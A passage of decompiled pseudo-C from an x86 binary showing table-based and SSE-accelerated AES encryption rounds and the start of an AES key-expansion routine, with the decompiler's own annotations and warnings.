  v25 += 8;
  v17 = sub_4580D0();
  v18 = 0;
  v23 = 0;
  for ( i = 0; i < 0x800; i += v17 )
    v23 &= *(int *)((char *)dword_4EEEF0 + i);
  v23 &= dword_4EEEF0[510];
  v26 |= v23;
  v27 |= v23;
  v28 |= v23;
  v29 |= v23;
  v30 ^= dword_4EEEF4[2 * (unsigned __int8)v29];
  v29 >>= 8;
  v33 ^= *(int *)((char *)&dword_4EEEF0[2 * (unsigned __int8)v29] + 1);
  v29 >>= 8;
  v32 ^= *(int *)((char *)&dword_4EEEF0[2 * (unsigned __int8)v29] + 2);
  v29 >>= 8;
  v31 ^= *(int *)((char *)&dword_4EEEF0[2 * v29] + 3);
  v33 ^= dword_4EEEF4[2 * (unsigned __int8)v28];
  v28 >>= 8;
  v32 ^= *(int *)((char *)&dword_4EEEF0[2 * (unsigned __int8)v28] + 1);
  v28 >>= 8;
  v31 ^= *(int *)((char *)&dword_4EEEF0[2 * (unsigned __int8)v28] + 2);
  v28 >>= 8;
  v30 ^= *(int *)((char *)&dword_4EEEF0[2 * v28] + 3);
  v32 ^= dword_4EEEF4[2 * (unsigned __int8)v27];
  v27 >>= 8;
  v31 ^= *(int *)((char *)&dword_4EEEF0[2 * (unsigned __int8)v27] + 1);
  v27 >>= 8;
  v30 ^= *(int *)((char *)&dword_4EEEF0[2 * (unsigned __int8)v27] + 2);
  v27 >>= 8;
  v33 ^= *(int *)((char *)&dword_4EEEF0[2 * v27] + 3);
  v31 ^= dword_4EEEF4[2 * (unsigned __int8)v26];
  v26 >>= 8;
  v30 ^= *(int *)((char *)&dword_4EEEF0[2 * (unsigned __int8)v26] + 1);
  v26 >>= 8;
  v33 ^= *(int *)((char *)&dword_4EEEF0[2 * (unsigned __int8)v26] + 2);
  v26 >>= 8;
  v32 ^= *(int *)((char *)&dword_4EEEF0[2 * v26] + 3);
  v20 = ((unsigned int)v21[2] >> 1) - 1;
  do
  {
    v26 = *v25;
    v27 = v25[1];
    v28 = v25[2];
    v29 = v25[3];
    v26 ^= *(int *)((char *)&dword_4EEEF0[2 * (unsigned __int8)v30] + 3);
    v30 >>= 8;
    v27 ^= *(int *)((char *)&dword_4EEEF0[2 * (unsigned __int8)v30] + 2);
    v30 >>= 8;
    v28 ^= *(int *)((char *)&dword_4EEEF0[2 * (unsigned __int8)v30] + 1);
    v30 >>= 8;
    v29 ^= dword_4EEEF4[2 * v30];
    v29 ^= *(int *)((char *)&dword_4EEEF0[2 * (unsigned __int8)v33] + 3);
    v33 >>= 8;
    v26 ^= *(int *)((char *)&dword_4EEEF0[2 * (unsigned __int8)v33] + 2);
    v33 >>= 8;
    v27 ^= *(int *)((char *)&dword_4EEEF0[2 * (unsigned __int8)v33] + 1);
    v33 >>= 8;
    v28 ^= dword_4EEEF4[2 * v33];
    v28 ^= *(int *)((char *)&dword_4EEEF0[2 * (unsigned __int8)v32] + 3);
    v32 >>= 8;
    v29 ^= *(int *)((char *)&dword_4EEEF0[2 * (unsigned __int8)v32] + 2);
    v32 >>= 8;
    v26 ^= *(int *)((char *)&dword_4EEEF0[2 * (unsigned __int8)v32] + 1);
    v32 >>= 8;
    v27 ^= dword_4EEEF4[2 * v32];
    v27 ^= *(int *)((char *)&dword_4EEEF0[2 * (unsigned __int8)v31] + 3);
    v31 >>= 8;
    v28 ^= *(int *)((char *)&dword_4EEEF0[2 * (unsigned __int8)v31] + 2);
    v31 >>= 8;
    v29 ^= *(int *)((char *)&dword_4EEEF0[2 * (unsigned __int8)v31] + 1);
    v31 >>= 8;
    v26 ^= dword_4EEEF4[2 * v31];
    v31 = v25[4];
    v32 = v25[5];
    v33 = v25[6];
    v30 = v25[7];
    v31 ^= *(int *)((char *)&dword_4EEEF0[2 * (unsigned __int8)v29] + 3);
    v29 >>= 8;
    v32 ^= *(int *)((char *)&dword_4EEEF0[2 * (unsigned __int8)v29] + 2);
    v29 >>= 8;
    v33 ^= *(int *)((char *)&dword_4EEEF0[2 * (unsigned __int8)v29] + 1);
    v29 >>= 8;
    v30 ^= dword_4EEEF4[2 * v29];
    v30 ^= *(int *)((char *)&dword_4EEEF0[2 * (unsigned __int8)v28] + 3);
    v28 >>= 8;
    v31 ^= *(int *)((char *)&dword_4EEEF0[2 * (unsigned __int8)v28] + 2);
    v28 >>= 8;
    v32 ^= *(int *)((char *)&dword_4EEEF0[2 * (unsigned __int8)v28] + 1);
    v28 >>= 8;
    v33 ^= dword_4EEEF4[2 * v28];
    v33 ^= *(int *)((char *)&dword_4EEEF0[2 * (unsigned __int8)v27] + 3);
    v27 >>= 8;
    v30 ^= *(int *)((char *)&dword_4EEEF0[2 * (unsigned __int8)v27] + 2);
    v27 >>= 8;
    v31 ^= *(int *)((char *)&dword_4EEEF0[2 * (unsigned __int8)v27] + 1);
    v27 >>= 8;
    v32 ^= dword_4EEEF4[2 * v27];
    v32 ^= *(int *)((char *)&dword_4EEEF0[2 * (unsigned __int8)v26] + 3);
    v26 >>= 8;
    v33 ^= *(int *)((char *)&dword_4EEEF0[2 * (unsigned __int8)v26] + 2);
    v26 >>= 8;
    v30 ^= *(int *)((char *)&dword_4EEEF0[2 * (unsigned __int8)v26] + 1);
    v26 >>= 8;
    v31 ^= dword_4EEEF4[2 * v26];
    v25 += 8;
    --v20;
  }
  while ( v20 );
  v24 = &v34;
  HIBYTE(v37) = BYTE1(dword_4EEEF0[2 * (unsigned __int8)v33]);
  v33 >>= 8;
  BYTE2(v34) = BYTE1(dword_4EEEF0[2 * (unsigned __int8)v33]);
  v33 >>= 8;
  BYTE1(v35) = BYTE1(dword_4EEEF0[2 * (unsigned __int8)v33]);
  v33 >>= 8;
  LOBYTE(v36) = BYTE1(dword_4EEEF0[2 * v33]);
  HIBYTE(v36) = BYTE1(dword_4EEEF0[2 * (unsigned __int8)v32]);
  v32 >>= 8;
  BYTE2(v37) = BYTE1(dword_4EEEF0[2 * (unsigned __int8)v32]);
  v32 >>= 8;
  BYTE1(v34) = BYTE1(dword_4EEEF0[2 * (unsigned __int8)v32]);
  v32 >>= 8;
  LOBYTE(v35) = BYTE1(dword_4EEEF0[2 * v32]);
  HIBYTE(v35) = BYTE1(dword_4EEEF0[2 * (unsigned __int8)v31]);
  v31 >>= 8;
  BYTE2(v36) = BYTE1(dword_4EEEF0[2 * (unsigned __int8)v31]);
  v31 >>= 8;
  BYTE1(v37) = BYTE1(dword_4EEEF0[2 * (unsigned __int8)v31]);
  v31 >>= 8;
  LOBYTE(v34) = BYTE1(dword_4EEEF0[2 * v31]);
  HIBYTE(v34) = BYTE1(dword_4EEEF0[2 * (unsigned __int8)v30]);
  v30 >>= 8;
  BYTE2(v35) = BYTE1(dword_4EEEF0[2 * (unsigned __int8)v30]);
  v30 >>= 8;
  BYTE1(v36) = BYTE1(dword_4EEEF0[2 * (unsigned __int8)v30]);
  v30 >>= 8;
  LOBYTE(v37) = BYTE1(dword_4EEEF0[2 * v30]);
  v16[0] = (int)a5;
  v16[1] = (int)a6;
  v15 = v25[3] ^ v37;
  v14 = v25[2] ^ v36;
  v13 = v25[1] ^ v35;
  v10 = sub_4578B1(v16, *v25 ^ v34);
  v11 = sub_4578B1(v10, v13);
  v12 = sub_4578B1(v11, v14);
  return sub_4578B1(v12, v15);
}
// 4EEEF0: using guessed type int dword_4EEEF0[];
// 4EEEF4: using guessed type int dword_4EEEF4[511];

//----- (00458AC4) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
unsigned int *__usercall sub_458AC4@<eax>(const __m128i *a1@<edx>, int a2@<ecx>, __m64 a3@<mm2>, __m64 a4@<mm3>)
{
  int v4; // edi
  int v5; // esi
  unsigned int v6; // eax
  __int8 *v7; // eax
  __m128i si128; // xmm4
  __m128i v9; // xmm1
  __m64 v10; // mm1
  unsigned int v11; // ebx
  unsigned int v12; // ecx
  unsigned int v13; // edx
  int i; // eax
  __m128i v15; // xmm2
  unsigned int v16; // eax
  unsigned int v17; // eax
  __m128i v18; // xmm2
  int v19; // edi
  __m128i v20; // xmm2
  __m64 v21; // mm1
  int v22; // edx
  int v23; // ecx
  int v24; // ebx
  unsigned int v25; // eax
  int v26; // edi
  __m128i v27; // xmm2
  int v28; // ebx
  __m64 v29; // mm1
  int v30; // edx
  int v31; // ecx
  unsigned int v32; // eax
  int v33; // edi
  int v34; // ecx
  int v35; // ebx
  __m64 v36; // mm1
  unsigned int v37; // edx
  unsigned int v38; // ecx
  unsigned int v39; // ebx
  unsigned int v40; // edi
  __m64 v41; // mm0
  unsigned int v42; // eax
  int v43; // eax
  unsigned int v44; // ebx
  int v45; // ebx
  int v46; // edi
  __m64 v47; // mm0
  int v48; // ecx
  int v49; // edx
  __m128i v50; // xmm2
  unsigned int v51; // eax
  __m128i v52; // xmm2
  int v53; // edi
  __m128i v54; // xmm2
  __m64 v55; // mm1
  int v56; // edx
  int v57; // ebx
  __m64 v58; // mm1
  int v59; // edx
  int v60; // ecx
  unsigned int v61; // eax
  int v62; // edi
  int v63; // ecx
  int v64; // ebx
  unsigned int v65; // edx
  unsigned int v66; // ecx
  unsigned int v67; // ebx
  unsigned int v68; // eax
  __int16 v69; // cx
  unsigned int v70; // edx
  unsigned int v71; // ebx
  int v72; // ecx
  unsigned int v73; // ecx
  unsigned int v74; // eax
  unsigned int j; // edx
  __m64 v76; // mm0
  unsigned int v77; // edi
  unsigned int v78; // eax
  int v79; // edi
  __m64 v80; // mm0
  unsigned int v81; // ebx
  __m64 v82; // mm0
  int v83; // eax
  int v84; // ebx
  unsigned int v85; // ecx
  int v86; // eax
  int v87; // ebx
  unsigned int v88; // edx
  int v89; // ebx
  __m64 v90; // mm0
  unsigned int v91; // edi
  unsigned int v92; // eax
  int v93; // edi
  __m64 v94; // mm0
  unsigned int v95; // ebx
  __m64 v96; // mm0
  int v97; // eax
  int v98; // ebx
  unsigned int v99; // ecx
  int v100; // eax
  int v101; // ebx
  unsigned int v102; // edx
  int v103; // ebx
  unsigned int v104; // edx
  unsigned int v105; // eax
  unsigned int v106; // ebx
  unsigned int v107; // ecx
  __m128i *v108; // ebx
  bool v109; // cc
  unsigned int v110; // ecx
  __m128i v111; // xmm2
  unsigned int *result; // eax
  int v113; // [esp+2C0h] [ebp-50h] BYREF
  void *retaddr; // [esp+310h] [ebp+0h] BYREF

  v4 = dword_4E80BC;
  *(_DWORD *)(a2 + 256) = &v113;
  v5 = STACK[0x6C8];
  v6 = STACK[0x6C8] & 0x10;
  *(__m128i *)&STACK[0x680] = _mm_load_si128((const __m128i *)((char *)a1 + v6 + 16));
  v7 = &a1[2].m128i_i8[v6 - v5];
  do
  {
    *(__m128i *)((char *)&STACK[0x5C0] + v5) = _mm_load_si128((const __m128i *)&v7[v5]);
    v5 += 16;
  }
  while ( v5 < 192 );
  si128 = _mm_load_si128((const __m128i *)&v7[v5]);
  v9 = _mm_load_si128(a1);
  v10 = _mm_cvtsi32_si64(a1[1].m128i_u32[0]);
  v11 = a1[1].m128i_u32[1];
  v12 = a1[1].m128i_u32[2];
  v13 = a1[1].m128i_u32[3];
  for ( i = 0; i < 2048; i += v4 + v4 + v4 + v4 )
    ;
  _mm_lfence();
  if ( (STACK[0x6C4] & 1) == 0 )
    goto LABEL_7;
  v15 = _mm_xor_si128(_mm_loadu_si128((const __m128i *)STACK[0x6A0]), v9);
  v9 = _mm_srli_si128(v9, 14);
  v16 = _mm_cvtsi128_si32(v9);
  LOBYTE(v16) = *(_BYTE *)(STACK[0x6A0] + 15);
  a3 = _mm_cvtsi32_si64(v16);
  a4 = _mm_cvtsi32_si64(1u);
  v17 = _mm_cvtsi128_si32(v15);
  v18 = _mm_srli_si128(v15, 4);
  v19 = _mm_cvtsi128_si32(v18);
  v20 = _mm_srli_si128(v18, 4);
  v21 = _m_pxor(v10, _mm_cvtsi32_si64(dword_4EEEF0[2 * (unsigned __int8)v17 + 1]));
  v22 = *(int *)((char *)&dword_4EEEF0[2 * BYTE1(v17)] + 1) ^ v13;
  v17 >>= 16;
  v23 = *(int *)((char *)&dword_4EEEF0[2 * (unsigned __int8)v17] + 2) ^ v12;
  v24 = *(int *)((char *)&dword_4EEEF0[2 * BYTE1(v17)] + 3) ^ v11;
  v25 = v19;
  v26 = _mm_cvtsi128_si32(v20);
  v27 = _mm_srli_si128(v20, 4);
  v28 = dword_4EEEF0[2 * (unsigned __int8)v25 + 1] ^ v24;
  v29 = _m_pxor(v21, _mm_cvtsi32_si64(*(int *)((char *)&dword_4EEEF0[2 * BYTE1(v25)] + 1)));
  v25 >>= 16;
  v30 = *(int *)((char *)&dword_4EEEF0[2 * (unsigned __int8)v25] + 2) ^ v22;
  v31 = *(int *)((char *)&dword_4EEEF0[2 * BYTE1(v25)] + 3) ^ v23;
  v32 = v26;
  v33 = _mm_cvtsi128_si32(v27);
  v34 = dword_4EEEF0[2 * (unsigned __int8)v32 + 1] ^ v31;
  v35 = *(int *)((char *)&dword_4EEEF0[2 * BYTE1(v32)] + 1) ^ v28;
  v32 >>= 16;
  v36 = _m_pxor(v29, _mm_cvtsi32_si64(*(int *)((char *)&dword_4EEEF0[2 * (unsigned __int8)v32] + 2)));
  v37 = dword_4EEEF0[2 * (unsigned __int8)v33 + 1] ^ *(int *)((char *)&dword_4EEEF0[2 * BYTE1(v32)] + 3) ^ v30;
  v38 = *(int *)((char *)&dword_4EEEF0[2 * BYTE1(v33)] + 1) ^ v34;
  v39 = *(int *)((char *)&dword_4EEEF0[2 * BYTE2(v33)] + 2) ^ v35;
  v40 = *(int *)((char *)&dword_4EEEF0[2 * (unsigned __int8)v39] + 3) ^ STACK[0x688];
  v41 = _m_pxor(
          _m_pxor(
            _mm_cvtsi32_si64(STACK[0x68C]),
            _mm_cvtsi32_si64(*(int *)((char *)&dword_4EEEF0[2 * (unsigned __int8)v38] + 3))),
          _mm_cvtsi32_si64(*(int *)((char *)&dword_4EEEF0[2 * BYTE1(v39)] + 2)));
  v39 >>= 16;
  v42 = *(int *)((char *)&dword_4EEEF0[2 * BYTE1(v38)] + 2) ^ *(int *)((char *)&dword_4EEEF0[2 * (unsigned __int8)v39]
                                                                     + 1) ^ STACK[0x680];
  v38 >>= 16;
  v43 = *(int *)((char *)&dword_4EEEF0[2 * (unsigned __int8)v37] + 3) ^ v42;
  v44 = *(int *)((char *)&dword_4EEEF0[2 * BYTE1(v37)] + 2) ^ STACK[0x684] ^ dword_4EEEF0[2 * BYTE1(v39) + 1];
  v37 >>= 16;
  v45 = *(int *)((char *)&dword_4EEEF0[2 * (unsigned __int8)v38] + 1) ^ v44;
  v46 = *(int *)((char *)&dword_4EEEF0[2 * (unsigned __int8)v37] + 1) ^ dword_4EEEF0[2 * BYTE1(v38) + 1] ^ v40;
  v47 = _m_pxor(v41, _mm_cvtsi32_si64(dword_4EEEF0[2 * BYTE1(v37) + 1]));
  v48 = _mm_cvtsi128_si32(_mm_srli_si128(v27, 3));
  v49 = _mm_cvtsi64_si32(v36);
  STACK[0x5CC] = _mm_cvtsi64_si32(v47);
  STACK[0x5C0] = v43;
  STACK[0x5C4] = v45;
  STACK[0x5C8] = v46;
LABEL_9:
  a3 = _m_paddb(a3, a4);
  v70 = *(int *)((char *)&dword_4EEEF0[2 * v48] + 3) ^ v49;
  v71 = *(int *)((char *)&dword_4EEEF0[2 * (unsigned __int8)v70] + 3) ^ v45;
  v72 = *(int *)((char *)&dword_4EEEF0[2 * BYTE1(v70)] + 2);
  v70 >>= 16;
  v73 = STACK[0x5C8] ^ v72;
  v74 = dword_4EEEF0[2 * BYTE1(v70) + 1] ^ v43;
  for ( j = STACK[0x5CC] ^ *(int *)((char *)&dword_4EEEF0[2 * (unsigned __int8)v70] + 1);
        ;
        j = _mm_cvtsi64_si32(_m_pxor(v82, _mm_cvtsi32_si64(dword_4EEEF0[2 * BYTE1(v88) + 1]))) )
  {
    v90 = _m_pxor(
            _mm_cvtsi32_si64(STACK[0x5CC]),
            _mm_cvtsi32_si64(*(int *)((char *)&dword_4EEEF0[2 * (unsigned __int8)v73] + 3)));
    LOBYTE(v73) = v74;
    v91 = *(int *)((char *)&dword_4EEEF0[2 * BYTE1(v74)] + 2) ^ STACK[0x5C8];
    v92 = HIWORD(v74);
    v93 = *(int *)((char *)&dword_4EEEF0[2 * (unsigned __int8)v71] + 3) ^ v91;
    v94 = _m_pxor(v90, _mm_cvtsi32_si64(*(int *)((char *)&dword_4EEEF0[2 * BYTE1(v71)] + 2)));
    v95 = HIWORD(v71);
    v96 = _m_pxor(v94, _mm_cvtsi32_si64(*(int *)((char *)&dword_4EEEF0[2 * (unsigned __int8)v92] + 1)));
    v97 = *(int *)((char *)&dword_4EEEF0[2 * BYTE1(v73)] + 2) ^ *(int *)((char *)&dword_4EEEF0[2 * (unsigned __int8)v95]
                                                                       + 1) ^ dword_4EEEF0[2 * BYTE1(v92) + 1];
    v98 = *(int *)((char *)&dword_4EEEF0[2 * (unsigned __int8)v73] + 3) ^ dword_4EEEF0[2 * BYTE1(v95) + 1];
    v99 = HIWORD(v73);
    v100 = *(int *)((char *)&dword_4EEEF0[2 * (unsigned __int8)j] + 3) ^ v97;
    v101 = *(int *)((char *)&dword_4EEEF0[2 * BYTE1(j)] + 2) ^ v98;
    v102 = HIWORD(j);
    v103 = *(int *)((char *)&dword_4EEEF0[2 * (unsigned __int8)v99] + 1) ^ v101;
    v66 = *(int *)((char *)&dword_4EEEF0[2 * (unsigned __int8)v102] + 1) ^ dword_4EEEF0[2 * BYTE1(v99) + 1] ^ v93;
    v68 = STACK[0x5C0] ^ v100;
    v67 = STACK[0x5C4] ^ v103;
    v65 = _mm_cvtsi64_si32(_m_pxor(v96, _mm_cvtsi32_si64(dword_4EEEF0[2 * BYTE1(v102) + 1])));
    if ( ((unsigned int)&retaddr & 0xFF) != 0 )
      goto LABEL_10;
    LOWORD(STACK[0x5E2]) = LOWORD(dword_4EEEF0[2 * (unsigned __int8)v65]) ^ BYTE1(dword_4EEEF0[2 * BYTE1(v66)]);
    LOWORD(STACK[0x5E6]) = LOWORD(dword_4EEEF0[2 * (unsigned __int8)v68]) ^ BYTE1(dword_4EEEF0[2 * BYTE1(v65)]);
    v104 = HIWORD(v65);
    LOWORD(STACK[0x5EA]) = LOWORD(dword_4EEEF0[2 * (unsigned __int8)v67]) ^ BYTE1(dword_4EEEF0[2 * BYTE1(v68)]);
    v105 = HIWORD(v68);
    LOWORD(STACK[0x5EE]) = LOWORD(dword_4EEEF0[2 * (unsigned __int8)v66]) ^ BYTE1(dword_4EEEF0[2 * BYTE1(v67)]);
    v106 = HIWORD(v67);
    LOWORD(STACK[0x5EC]) = LOWORD(dword_4EEEF0[2 * (unsigned __int8)v105]) ^ BYTE1(dword_4EEEF0[2 * BYTE1(v104)]);
    v107 = HIWORD(v66);
    LOWORD(STACK[0x5E0]) = LOWORD(dword_4EEEF0[2 * (unsigned __int8)v106]) ^ BYTE1(dword_4EEEF0[2 * BYTE1(v105)]);
    LOWORD(STACK[0x5E4]) = LOWORD(dword_4EEEF0[2 * (unsigned __int8)v107]) ^ BYTE1(dword_4EEEF0[2 * BYTE1(v106)]);
    LOWORD(STACK[0x5E8]) = LOWORD(dword_4EEEF0[2 * (unsigned __int8)v104]) ^ BYTE1(dword_4EEEF0[2 * BYTE1(v107)]);
    v108 = (__m128i *)STACK[0x5FC];
    v109 = (int)STACK[0x614] <= 16;
    v110 = STACK[0x614] - 16;
    v111 = _mm_xor_si128(_mm_loadu_si128((const __m128i *)STACK[0x5F8]), si128);
    *(__m128i *)&STACK[0x5F0] = _mm_add_epi32(_mm_load_si128((const __m128i *)&STACK[0x600]), *(__m128i *)&STACK[0x5F0]);
    *v108 = _mm_xor_si128(v111, *(__m128i *)&STACK[0x5E0]);
    if ( v109 )
      break;
    STACK[0x614] = v110;
    if ( (v110 & 1) != 0 )
    {
      v69 = _mm_cvtsi64_si32(a3);
      v49 = _mm_cvtsi64_si32(v36);
      v43 = STACK[0x510];
      v45 = STACK[0x514];
      v48 = (unsigned __int8)(HIBYTE(v69) ^ v69);
      goto LABEL_9;
    }
    v10 = _mm_cvtsi32_si64(STACK[0x5D0]);
    v11 = STACK[0x5D4];
    v12 = STACK[0x5D8];
    v13 = STACK[0x5DC];
LABEL_7:
    v50 = _mm_xor_si128(
            _mm_xor_si128(_mm_loadu_si128((const __m128i *)STACK[0x5F0]), v9),
            _mm_loadu_si128((const __m128i *)STACK[0x5F4]));
    v51 = _mm_cvtsi128_si32(v50);
    v52 = _mm_srli_si128(v50, 4);
    v53 = _mm_cvtsi128_si32(v52);
    v54 = _mm_srli_si128(v52, 4);
    v55 = _m_pxor(v10, _mm_cvtsi32_si64(dword_4EEEF0[2 * (unsigned __int8)v51 + 1]));
    v56 = *(int *)((char *)&dword_4EEEF0[2 * BYTE1(v51)] + 1) ^ v13;
    v51 >>= 16;
    v57 = dword_4EEEF0[2 * (unsigned __int8)v53 + 1] ^ *(int *)((char *)&dword_4EEEF0[2 * BYTE1(v51)] + 3) ^ v11;
    v58 = _m_pxor(v55, _mm_cvtsi32_si64(*(int *)((char *)&dword_4EEEF0[2 * BYTE1(v53)] + 1)));
    v59 = *(int *)((char *)&dword_4EEEF0[2 * BYTE2(v53)] + 2) ^ v56;
    v60 = *(int *)((char *)&dword_4EEEF0[2 * HIBYTE(v53)] + 3) ^ *(int *)((char *)&dword_4EEEF0[2 * (unsigned __int8)v51]
                                                                        + 2) ^ v12;
    v61 = _mm_cvtsi128_si32(v54);
    v62 = _mm_cvtsi128_si32(_mm_srli_si128(v54, 4));
    v63 = dword_4EEEF0[2 * (unsigned __int8)v61 + 1] ^ v60;
    v64 = *(int *)((char *)&dword_4EEEF0[2 * BYTE1(v61)] + 1) ^ v57;
    v61 >>= 16;
    v65 = dword_4EEEF0[2 * (unsigned __int8)v62 + 1] ^ *(int *)((char *)&dword_4EEEF0[2 * BYTE1(v61)] + 3) ^ v59;
    v66 = *(int *)((char *)&dword_4EEEF0[2 * BYTE1(v62)] + 1) ^ v63;
    v67 = *(int *)((char *)&dword_4EEEF0[2 * BYTE2(v62)] + 2) ^ v64;
    v36 = _m_pxor(
            _m_pxor(v58, _mm_cvtsi32_si64(*(int *)((char *)&dword_4EEEF0[2 * (unsigned __int8)v61] + 2))),
            _mm_cvtsi32_si64(*(int *)((char *)&dword_4EEEF0[2 * HIBYTE(v62)] + 3)));
    v68 = _mm_cvtsi64_si32(v36);
LABEL_10:
    v76 = _m_pxor(
            _mm_cvtsi32_si64(STACK[0x5DC]),
            _mm_cvtsi32_si64(*(int *)((char *)&dword_4EEEF0[2 * (unsigned __int8)v66] + 3)));
    LOBYTE(v66) = v68;
    v77 = *(int *)((char *)&dword_4EEEF0[2 * BYTE1(v68)] + 2) ^ STACK[0x5D8];
    v78 = HIWORD(v68);
    v79 = *(int *)((char *)&dword_4EEEF0[2 * (unsigned __int8)v67] + 3) ^ v77;
    v80 = _m_pxor(v76, _mm_cvtsi32_si64(*(int *)((char *)&dword_4EEEF0[2 * BYTE1(v67)] + 2)));
    v81 = HIWORD(v67);
    v82 = _m_pxor(v80, _mm_cvtsi32_si64(*(int *)((char *)&dword_4EEEF0[2 * (unsigned __int8)v78] + 1)));
    v83 = *(int *)((char *)&dword_4EEEF0[2 * BYTE1(v66)] + 2) ^ *(int *)((char *)&dword_4EEEF0[2 * (unsigned __int8)v81]
                                                                       + 1) ^ dword_4EEEF0[2 * BYTE1(v78) + 1];
    v84 = *(int *)((char *)&dword_4EEEF0[2 * (unsigned __int8)v66] + 3) ^ dword_4EEEF0[2 * BYTE1(v81) + 1];
    v85 = HIWORD(v66);
    v86 = *(int *)((char *)&dword_4EEEF0[2 * (unsigned __int8)v65] + 3) ^ v83;
    v87 = *(int *)((char *)&dword_4EEEF0[2 * BYTE1(v65)] + 2) ^ v84;
    v88 = HIWORD(v65);
    v89 = *(int *)((char *)&dword_4EEEF0[2 * (unsigned __int8)v85] + 1) ^ v87;
    v73 = *(int *)((char *)&dword_4EEEF0[2 * (unsigned __int8)v88] + 1) ^ dword_4EEEF0[2 * BYTE1(v85) + 1] ^ v79;
    v74 = STACK[0x5D0] ^ v86;
    v71 = STACK[0x5D4] ^ v89;
  }
  result = &STACK[0x580];
  *(_OWORD *)&STACK[0x510] = 0i64;
  *(_OWORD *)&STACK[0x520] = 0i64;
  *(_OWORD *)&STACK[0x530] = 0i64;
  *(_OWORD *)&STACK[0x540] = 0i64;
  *(_OWORD *)&STACK[0x550] = 0i64;
  *(_OWORD *)&STACK[0x560] = 0i64;
  *(_OWORD *)&STACK[0x570] = 0i64;
  *(_OWORD *)&STACK[0x580] = 0i64;
  *(_OWORD *)&STACK[0x590] = 0i64;
  *(_OWORD *)&STACK[0x5A0] = 0i64;
  *(_OWORD *)&STACK[0x5B0] = 0i64;
  *(_OWORD *)&STACK[0x5C0] = 0i64;
  *(_OWORD *)&STACK[0x5D0] = 0i64;
  *(_OWORD *)&STACK[0x5E0] = 0i64;
  _m_empty();
  return result;
}
// 458E41: positive sp value 40 has been found
// 4590DF: returning address of temporary local variable '%0x580'
// 4E80BC: using guessed type int dword_4E80BC;
// 4EEEF0: using guessed type int dword_4EEEF0[];

//----- (0045912B) --------------------------------------------------------
int __thiscall sub_45912B(_DWORD *this, char *a2, size_t a3, int a4)
{
  int result; // eax
  unsigned __int32 v5; // [esp+Ch] [ebp-70h]
  unsigned int v6; // [esp+10h] [ebp-6Ch]
  unsigned __int32 v7; // [esp+14h] [ebp-68h]
  unsigned int v8; // [esp+18h] [ebp-64h]
  unsigned __int32 v9; // [esp+1Ch] [ebp-60h]
  unsigned int v10; // [esp+20h] [ebp-5Ch]
  unsigned __int32 v11; // [esp+24h] [ebp-58h]
  unsigned int v12; // [esp+28h] [ebp-54h]
  unsigned __int32 v13; // [esp+2Ch] [ebp-50h]
  unsigned int v14; // [esp+30h] [ebp-4Ch]
  unsigned __int32 v15; // [esp+34h] [ebp-48h]
  unsigned int v16; // [esp+38h] [ebp-44h]
  unsigned __int32 v17; // [esp+3Ch] [ebp-40h]
  unsigned int v18; // [esp+40h] [ebp-3Ch]
  unsigned __int32 v19; // [esp+44h] [ebp-38h]
  unsigned int v20; // [esp+48h] [ebp-34h]
  void *v21; // [esp+50h] [ebp-2Ch]
  size_t v22; // [esp+54h] [ebp-28h]
  void *v23; // [esp+58h] [ebp-24h]
  int v24; // [esp+60h] [ebp-1Ch]
  _DWORD *v25; // [esp+64h] [ebp-18h]
  unsigned int i; // [esp+68h] [ebp-14h]
  int v27; // [esp+6Ch] [ebp-10h]
  int v28; // [esp+6Ch] [ebp-10h]
  int v29; // [esp+6Ch] [ebp-10h]
  int v30; // [esp+6Ch] [ebp-10h]
  int v31; // [esp+6Ch] [ebp-10h]
  int v32; // [esp+6Ch] [ebp-10h]
  unsigned int v34; // [esp+74h] [ebp-8h]
  int v35; // [esp+78h] [ebp-4h]
  unsigned __int32 *v36; // [esp+78h] [ebp-4h]

  nullsub_1(a3);
  sub_418EE0(this + 8, 0x120Cu);
  this[9] = 0;
  this[3] = (a3 >> 2) + 6;
  sub_443C00(this + 4, 4 * this[3] + 4);
  v35 = this[7];
  if ( sub_4580F0() && sub_458130() )
  {
    sub_467B80(a2, a3, (char *)v35);
    result = (*(unsigned __int8 (__thiscall **)(_DWORD *))(this[1] + 32))(this + 1);
    if ( !(_BYTE)result )
      return sub_467B20((_OWORD *)this[7], this[3]);
  }
  else
  {
    sub_457986(1, (char *)v35, a3 >> 2, a2, a3);
    v25 = &unk_4BD060;
    while ( 1 )
    {
      v27 = *(_DWORD *)(v35 + 4 * (a3 >> 2) - 4);
      *(_DWORD *)(v35 + 4 * (a3 >> 2)) = *v25++ ^ (unsigned __int8)RijnDael_AES_LONG_4BCE60[HIBYTE(v27)] ^ ((unsigned __int8)RijnDael_AES_LONG_4BCE60[(unsigned __int8)v27] << 8) ^ ((unsigned __int8)RijnDael_AES_LONG_4BCE60[BYTE1(v27)] << 16) ^ ((unsigned __int8)RijnDael_AES_LONG_4BCE60[BYTE2(v27)] << 24) ^ *(_DWORD *)v35;
      *(_DWORD *)(v35 + 4 * (a3 >> 2) + 4) = *(_DWORD *)(v35 + 4 * (a3 >> 2)) ^ *(_DWORD *)(v35 + 4);
      *(_DWORD *)(v35 + 4 * (a3 >> 2) + 8) = *(_DWORD *)(v35 + 4 * (a3 >> 2) + 4) ^ *(_DWORD *)(v35 + 8);
      *(_DWORD *)(v35 + 4 * (a3 >> 2) + 12) = *(_DWORD *)(v35 + 4 * (a3 >> 2) + 8) ^ *(_DWORD *)(v35 + 12);
      if ( v35 + 4 * (a3 >> 2) + 16 == this[7] + 4 * this[6] )
        break;
      if ( a3 == 24 )
      {
        *(_DWORD *)(v35 + 40) = *(_DWORD *)(v35 + 36) ^ *(_DWORD *)(v35 + 16);
        *(_DWORD *)(v35 + 44) = *(_DWORD *)(v35 + 40) ^ *(_DWORD *)(v35 + 20);
      }
      else if ( a3 == 32 )
      {
        v28 = *(_DWORD *)(v35 + 44);
        *(_DWORD *)(v35 + 48) = (unsigned __int8)RijnDael_AES_LONG_4BCE60[(unsigned __int8)v28] ^ ((unsigned __int8)RijnDael_AES_LONG_4BCE60[BYTE1(v28)] << 8) ^ ((unsigned __int8)RijnDael_AES_LONG_4BCE60[BYTE2(v28)] << 16) ^ *(_DWORD *)(v35 + 16) ^ ((unsigned __int8)RijnDael_AES_LONG_4BCE60[HIBYTE(v28)] << 24);
        *(_DWORD *)(v35 + 52) = *(_DWORD *)(v35 + 48) ^ *(_DWORD *)(v35 + 20);
        *(_DWORD *)(v35 + 56) = *(_DWORD *)(v35 + 52) ^ *(_DWORD *)(v35 + 24);
        *(_DWORD *)(v35 + 60) = *(_DWORD *)(v35 + 56) ^ *(_DWORD *)(v35 + 28);
